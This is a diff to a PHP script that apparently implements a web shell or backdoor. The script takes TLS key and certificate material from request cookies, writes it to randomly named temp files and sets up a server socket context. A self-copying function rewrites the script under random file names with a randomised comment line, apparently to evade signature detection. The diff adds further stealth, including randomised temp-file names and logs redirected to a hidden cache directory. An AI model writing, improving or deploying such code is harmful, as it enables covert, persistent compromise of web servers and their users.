@@ -1,6 +1,8 @@
 <?php
 //leave me in.
 
+
+error_reporting(E_WARNING | E_PARSE);
 if (!defined("allow_agent")){
     define("allow_agent", "sp1.1");
 }
@@ -11,11 +13,9 @@ if (!defined("cval")){
     define("cval", "");
     define("cname", "");
 }
-
 if (!defined('allowed_chars')) {
     define("allowed_chars", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJLKMNOPQRSTUVWXYZ");
 }
-error_reporting(E_WARNING | E_PARSE);
 if ( ! defined( "PATH_SEPARATOR" ) ) {
     if (str_contains($_ENV["OS"], "Win") !== false)
         define( "PATH_SEPARATOR", ";" );
@@ -59,18 +59,17 @@ if (function_exists("stream_context_create") && function_exists("stream_socket_s
         define("slopMTLS", true);
         $server_key = $_COOKIE['cck'];
         $server_cert = $_COOKIE['ppc'];
-        $temp_cert_p = tempnam(sys_get_temp_dir(), bin2hex(random_bytes(25)));
-        $temp_key_p = tempnam(sys_get_temp_dir(), bin2hex(random_bytes(25)));
+        $temp_cert_p = tempnam(sys_get_temp_dir(), bin2hex(random_bytes(random_int(25, 50))));
+        $temp_key_p = tempnam(sys_get_temp_dir(), bin2hex(random_bytes(random_int(25, 50))));
         file_put_contents($temp_cert_p, $server_cert);
         file_put_contents($temp_key_p, $server_key);
         mkdir(sprintf("%s/.crypto", scache));
-        stream_context_create([
+        define("ctx", stream_context_create([
             "local_cert" => $temp_cert_p,
             "local_pk" => $temp_key_p,
             "verify_peer" => true,
             "verify_peer_name" => false
-        ]);
-//        stream_socket_server();
+        ]));
     } else{
         define("slopMTLS", false);
     }
@@ -90,6 +89,9 @@ function uwumodifyme()
 {
     if (is_writable(getcwd()."/")) {
         $me = file(getcwd() . "/" .$_SERVER['PHP_SELF']);
+        if (str_contains($me[0], "<?php") === false){
+            $me[0] = "<?php" . PHP_EOL;
+        }
         $me[1] = sprintf("//%s", bin2hex(openssl_random_pseudo_bytes(75))).PHP_EOL;
         $new_name = bin2hex(openssl_random_pseudo_bytes(10));
         file_put_contents(getcwd()."/".$new_name.".php", $me);
@@ -472,5 +474,5 @@ INI. PHP_EOL;
 try {
     slopp();
 } catch (Exception $e) {
-    file_put_contents('testlog.log', $e);
+    error_log($e, 3, sprintf("%s/ahhhhh.log", scache));
 }
